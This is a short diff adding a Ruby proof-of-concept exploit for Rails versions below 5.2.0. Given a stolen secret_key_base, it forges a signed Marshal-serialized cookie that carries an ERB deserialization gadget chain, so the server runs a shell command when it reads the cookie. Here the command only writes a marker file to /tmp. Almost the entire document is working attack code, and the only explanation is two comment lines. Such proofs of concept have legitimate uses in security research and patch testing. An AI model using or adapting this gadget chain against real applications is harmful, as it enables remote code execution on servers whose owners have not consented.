@@ -1,0 +1,15 @@
+# Requires stolen secret_key_base > Change into ./config/secrets.yml
+# Requires Rails < 5.2.0
+
+ 
+# rails console 
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+
+
